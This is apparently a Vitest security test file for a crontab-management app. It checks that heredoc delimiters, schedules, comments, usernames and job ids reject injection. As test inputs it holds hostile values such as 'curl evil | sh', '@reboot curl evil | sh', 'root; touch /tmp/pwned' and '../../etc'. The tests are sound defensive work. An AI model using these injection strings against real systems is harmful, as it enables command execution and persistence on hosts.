import { beforeEach, describe, expect, it, vi } from "vitest";

const shell = vi.hoisted(() => ({
  commands: [] as string[],
  crontab: "",
}));

vi.mock("child_process", async (importOriginal) => {
  const actual = await importOriginal<typeof import("child_process")>();
  return {
    ...actual,
    exec: vi.fn((command: string, ...rest: unknown[]) => {
      shell.commands.push(command);
      const callback = rest.find((arg) => typeof arg === "function") as
        | ((error: Error | null, result: { stdout: string; stderr: string }) => void)
        | undefined;
      const stdout = command.startsWith("crontab -l") ? shell.crontab : "";
      callback?.(null, { stdout, stderr: "" });
    }),
  };
});

vi.mock("@/app/_server/actions/global", () => ({
  isDocker: vi.fn().mockResolvedValue(false),
  getHostDataPath: vi.fn().mockResolvedValue(null),
  getHostScriptsPath: vi.fn().mockResolvedValue(null),
}));

vi.mock("@/app/_utils/crontab-utils", () => ({
  readAllHostCrontabs: vi.fn().mockResolvedValue([]),
  writeHostCrontabForUser: vi.fn().mockResolvedValue(true),
  getAllTargetUsers: vi.fn().mockResolvedValue(["root"]),
}));

import { addCronJob, updateCronJob, writeUserCrontab } from "@/app/_utils/cronjob-utils";
import { WRITE_CRONTAB, WRITE_CRON_FILE } from "@/app/_consts/commands";
import { wrapCommandWithLogger } from "@/app/_utils/wrapper-utils";

const heredocBody = (command: string) => {
  const [first, ...rest] = command.split("\n");
  const delimiter = first.match(/<< '([^']+)'$/)?.[1];
  expect(delimiter).toBeTruthy();
  expect(rest[rest.length - 1]).toBe(delimiter);
  const body = rest.slice(0, -1);
  expect(body).not.toContain(delimiter);
  return body;
};

beforeEach(() => {
  shell.commands = [];
  shell.crontab = "";
  vi.spyOn(console, "error").mockImplementation(() => {});
  vi.spyOn(console, "warn").mockImplementation(() => {});
});

describe("heredoc writes", () => {
  it("cannot be terminated early by an EOF line in the crontab", () => {
    const content = "# job\n* * * * * echo hi\nEOF\ntouch /tmp/pwned";
    const command = WRITE_CRONTAB(content, "root");
    expect(heredocBody(command)).toEqual(content.split("\n"));
    expect(command.split("\n")[0]).toMatch(/^crontab -u 'root' - << 'CRONMASTER_EOF_[0-9a-f]{16}'$/);
  });

  it("uses a fresh delimiter for the plain crontab too", () => {
    const command = WRITE_CRON_FILE("EOF\nid");
    expect(heredocBody(command)).toEqual(["EOF", "id"]);
    expect(WRITE_CRON_FILE("x")).not.toBe(WRITE_CRON_FILE("x"));
  });
});

describe("crontab line injection", () => {
  it("keeps a multi-line comment on a single crontab line", async () => {
    await addCronJob("*/5 * * * *", "echo hi", "nightly\n* * * * * curl evil | sh", "root");

    const write = shell.commands.find((cmd) => cmd.startsWith("crontab -u"));
    const body = heredocBody(write!);
    expect(body).toHaveLength(2);
    expect(body[0]).toMatch(/^# nightly \* \* \* \* \* curl evil \| sh/);
    expect(body[1]).toBe("*/5 * * * * echo hi");
  });

  it("refuses schedules that smuggle extra lines", async () => {
    await expect(
      addCronJob("* * * * *\n@reboot curl evil | sh", "echo hi", "", "root")
    ).rejects.toThrow("Invalid cron schedule");
    expect(shell.commands.some((cmd) => cmd.startsWith("crontab -u"))).toBe(false);
  });

  it("refuses usernames that are not plain usernames", async () => {
    await expect(
      addCronJob("* * * * *", "echo hi", "", "root; touch /tmp/pwned")
    ).rejects.toThrow("Invalid crontab user");
    expect(shell.commands).toEqual([]);
    await expect(writeUserCrontab("-r", "")).resolves.toBe(false);
    expect(shell.commands).toEqual([]);
  });

  it("updateCronJob rejects bad schedules before touching the crontab", async () => {
    shell.crontab = "# id: abcd-1234\n* * * * * echo hi\n";
    await expect(
      updateCronJob(
        { id: "abcd-1234", schedule: "* * * * *", command: "echo hi", user: "root" },
        "* * * * *\n* * * * * id",
        "echo hi"
      )
    ).rejects.toThrow("Invalid cron schedule");
    expect(shell.commands.some((cmd) => cmd.startsWith("crontab -u"))).toBe(false);
  });

  it("refuses to build a logging wrapper around a hostile job id", async () => {
    await expect(
      wrapCommandWithLogger('x" ; touch /tmp/pwned ; "', "echo hi", false)
    ).rejects.toThrow("Invalid cron job id");
    await expect(wrapCommandWithLogger("../../etc", "echo hi", false)).rejects.toThrow(
      "Invalid cron job id"
    );
  });
});
